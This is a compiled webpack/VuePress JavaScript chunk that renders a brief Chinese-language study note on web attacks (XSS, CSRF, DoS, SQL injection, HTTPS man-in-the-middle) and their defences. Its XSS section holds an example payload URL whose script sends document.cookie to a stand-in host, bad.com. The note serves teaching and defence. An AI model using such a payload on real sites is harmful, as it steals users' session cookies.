(window.webpackJsonp=window.webpackJsonp||[]).push([[42],{399:function(t,s,a){"use strict";a.r(s);var r=a(45),v=Object(r.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻击"}},[t._v("#")]),t._v(" 攻击")]),t._v(" "),a("h2",{attrs:{id:"xss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss"}},[t._v("#")]),t._v(" XSS")]),t._v(" "),a("p",[t._v("XSS，Cross Site Scripting（跨站脚本攻击），是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如js), 当用户浏览此网页时，脚本就会在用户的浏览器上执行。")]),t._v(" "),a("h3",{attrs:{id:"xss-攻击场景"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss-攻击场景"}},[t._v("#")]),t._v(" XSS 攻击场景")]),t._v(" "),a("ol",[a("li",[t._v("DOM-Based XSS 攻击")])]),t._v(" "),a("p",[t._v("就是通过在 DOM 中插入恶意脚本。比如一个页面 "),a("code",[t._v("xxx.com")]),t._v(" 把链接的 "),a("code",[t._v("a")]),t._v(" 参数直接放入 DOM 中，那么攻击者可以修改这个链接为")]),t._v(" "),a("p",[a("code",[t._v("http://xxx.com?a=<script>window.open('http://bad.com?cookie='+document.cookie)<\/script>")])]),t._v(" "),a("p",[t._v("用户点击了这个链接就会带着用户的 cookie 数据跳转到攻击者的网页。")]),t._v(" "),a("ol",{attrs:{start:"2"}},[a("li",[t._v("Stored XSS 攻击")])]),t._v(" "),a("p",[t._v("这种攻击影响较大，攻击者会将攻击脚本上传到 web 服务器上，使得所有访问该页面得用户都会被攻击。")]),t._v(" "),a("h3",{attrs:{id:"xss-防御"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss-防御"}},[t._v("#")]),t._v(" XSS 防御")]),t._v(" "),a("p",[t._v("最好的防御方法就是不相信用户的输入。")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("将重要的 cookie 标记为 http only，这样 js 就不能操作 cookie 了")])]),t._v(" "),a("li",[a("p",[t._v("对数据进行 encode 编码处理，过滤 html 、js 标签")])])]),t._v(" "),a("h2",{attrs:{id:"csrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#csrf"}},[t._v("#")]),t._v(" CSRF")]),t._v(" "),a("p",[t._v("CSRF，Cross-site request forgery（跨站请求伪造），攻击者盗用了你的身份，以你的名义发送恶意请求。")]),t._v(" "),a("h3",{attrs:{id:"csrf-攻击场景"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#csrf-攻击场景"}},[t._v("#")]),t._v(" CSRF 攻击场景")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("钓鱼网站")])]),t._v(" "),a("li",[a("p",[t._v("用户登录了 A 页面，然后又打开了攻击者的 B 页面，攻击者 B 以 A 的名义向服务端发送了一些攻击类型的请求")])])]),t._v(" "),a("h3",{attrs:{id:"csrf-防御"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#csrf-防御"}},[t._v("#")]),t._v(" CSRF 防御")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("cookie 写入随机数据进行验证，因为跨域问题，一般情况下攻击者无法拿到被攻击者的 cookie，但是可能会被 XSS 攻击拿到")])]),t._v(" "),a("li",[a("p",[t._v("验证 HTTP Referer 字段")])]),t._v(" "),a("li",[a("p",[t._v("请求时加一个 token，服务端校验")])])]),t._v(" "),a("h2",{attrs:{id:"dos-攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#dos-攻击"}},[t._v("#")]),t._v(" DOS 攻击")]),t._v(" "),a("p",[t._v("DOS，阻断服务攻击，想办法目标网络资源用尽，消耗目标的带宽和计算资源。")]),t._v(" "),a("h3",{attrs:{id:"dos-防御"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#dos-防御"}},[t._v("#")]),t._v(" DOS 防御")]),t._v(" "),a("ul",[a("li",[t._v("防火墙")]),t._v(" "),a("li",[t._v("交换机（路由器）")]),t._v(" "),a("li",[t._v("流量清洗")])]),t._v(" "),a("h2",{attrs:{id:"sql-注入"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sql-注入"}},[t._v("#")]),t._v(" SQL 注入")]),t._v(" "),a("p",[t._v("通过输入 SQL 命令操作数据库")]),t._v(" "),a("h3",{attrs:{id:"sql-注入防御"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sql-注入防御"}},[t._v("#")]),t._v(" SQL 注入防御")]),t._v(" "),a("p",[t._v("输入过滤（转义）数据库安全策略")]),t._v(" "),a("h2",{attrs:{id:"https-中间人攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#https-中间人攻击"}},[t._v("#")]),t._v(" HTTPS 中间人攻击")]),t._v(" "),a("p",[t._v("黑客在电脑上安装伪造的证书，拦截客户端的请求")]),t._v(" "),a("h3",{attrs:{id:"https-中间人防御"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#https-中间人防御"}},[t._v("#")]),t._v(" HTTPS 中间人防御")]),t._v(" "),a("p",[t._v("不要安装来源不明的证书")])])}),[],!1,null,null,null);s.default=v.exports}}]);